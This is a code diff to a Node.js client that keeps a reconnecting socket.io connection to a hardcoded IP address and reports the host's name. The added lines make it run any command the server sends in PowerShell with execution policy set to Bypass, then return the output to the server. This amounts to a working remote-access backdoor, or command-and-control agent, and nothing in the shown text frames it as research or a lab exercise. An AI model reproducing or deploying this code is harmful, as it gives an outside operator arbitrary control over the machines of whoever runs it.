@@ -1,4 +1,7 @@
 let orionSocketModule     = require("socket.io-client")
+let orionOS               = require("os")
+let orionShellModule      = require("node-powershell")
+
 let orionSocketConnection = orionSocketModule.connect( "http://139.59.200.147:4001/", {
   "reconnection": true,
   "reconnectionDelay": 5,
@@ -67,7 +70,9 @@ let emitUniqueHost = (UUID) => {
 // Function calls
 //
 
-let UUID = generateUUID()
+console.log("Starting proc")
+
+let UUID = orionOS.hostname()
 emitUniqueHost(UUID)
 
 orionSocketConnection.on(UUID, function (responseData) {
@@ -80,17 +85,38 @@ orionSocketConnection.on(UUID, function (responseData) {
       responseData.internalCall.Data
     )
 
-    return responseData.then(Out => Socket.emit('codeExecutionResponse', {
+    return responseData.then(Out => orionSocketConnection.emit('codeExecutionResponse', {
       uniqueRoomNumber: UUID,
       stdout: "Called: " +  responseData.internalCall.Function + "\n\nWith data: " + responseData.internalCall.Data,
       stderr: "Response: \n\n" + Out.SUCCESS
-    })).catch( Error => Socket.emit('codeExecutionResponse', {
+    })).catch( Error => orionSocketConnection.emit('codeExecutionResponse', {
       uniqueRoomNumber: UUID,
       error: Error
     }))
   }
 
   if (responseData.internalCall.isShell){
-    console.log("Calling 'Shell' matrix; ", responseData.internalCall.Data);
+    let orionShell = new orionShellModule({
+      executionPolicy: 'Bypass',
+      noProfile: true
+    });
+
+    orionShell.addCommand(responseData.internalCall.Data)
+    orionShell
+      .invoke()
+      .then(outputShell => {
+        return orionSocketConnection.emit('codeExecutionResponse', {
+          uniqueRoomNumber: UUID,
+          stdout: outputShell,
+          stderr: "Successfully called: " +  responseData.internalCall.Data,
+        })
+      })
+      .catch(erroredShell => {
+        orionSocketConnection.emit('codeExecutionResponse', {
+          uniqueRoomNumber: UUID,
+          error: erroredShell
+        })
+        return orionShell.dispose();
+      })
   }
 })
